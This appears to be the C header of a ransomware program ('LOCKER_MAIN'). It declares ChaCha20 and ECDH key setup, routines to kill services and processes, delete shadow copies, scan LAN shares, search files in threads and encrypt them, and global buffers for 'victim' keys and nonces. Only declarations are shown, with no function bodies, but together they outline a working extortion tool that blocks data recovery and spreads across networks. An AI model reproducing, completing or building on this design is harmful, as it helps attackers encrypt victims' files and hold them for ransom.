#ifndef __LOCKER_MAIN__
#define __LOCKER_MAIN__

#include "libs/TinyECDH/ecdh.h"
#include "libs/ChaCha20/chacha20.h"
#include "libs/SHA256/sha256.h"

#define DEBUG
#ifdef DEBUG
	#include <stdio.h>
#endif

#define ARRAY_SIZE(x) (sizeof(x) / sizeof(x)[0])

//-- Core functions
BOOLEAN ChaChaKey1Setup();
VOID ECDHPrivateKeySetup(BYTE *input, int incount);
VOID MountVolumes();
VOID ServiceFucker();
VOID ProcessFucker();
VOID ShadowFucker();
VOID SearchLAN(LPNETRESOURCEW resourcename);
DWORD WINAPI SearchFilesThreaded(LPVOID lpParam);
VOID SearchFiles(WCHAR *pathname, int layer);
VOID CryptFile(const WCHAR *filename);

//-- Util functions
BOOL myIsWow64Process();
PCHAR *CommandLineToArgvA(PCHAR CmdLine, int *_argc);
LPVOID myHeapAlloc(int len);
VOID   myHeapFree(LPVOID mem);

//-- Unmanaged imports
typedef BOOL WINAPI(*pdef_IsWow64Process)(HANDLE hProcess, PBOOL bResult);
typedef BOOL WINAPI(*pdef_Wow64DisableWow64FsRedirection)(PVOID *OldValue);
typedef BOOL WINAPI(*pdef_Wow64RevertWow64FsRedirection)(PVOID OldValue);
typedef BOOLEAN WINAPI(*pdef_RtlGenRandom)(PVOID RandomBuffer,ULONG RandomBufferLength);

//-- Global variables
BYTE CHACHA20KEY_1[88];
BYTE CHACHA20KEY_2[44];

BYTE CHACHA20_FINAL_KEY_1[32];
BYTE CHACHA20_FINAL_KEY_2[32];

BYTE CHACHA20NONCE_1[12];
BYTE CHACHA20NONCE_2[12];

BYTE CHACHA20_FINAL_NONCE[12];

BYTE VICTIM_ECDH_PUBLIC_KEY[ECC_PUB_KEY_SIZE];
BYTE VICTIM_ECDH_PRIVATE_KEY[ECC_PRV_KEY_SIZE];

BYTE ECDH_SHARED_SECRET[ECC_PUB_KEY_SIZE];

CRITICAL_SECTION critSection;

#endif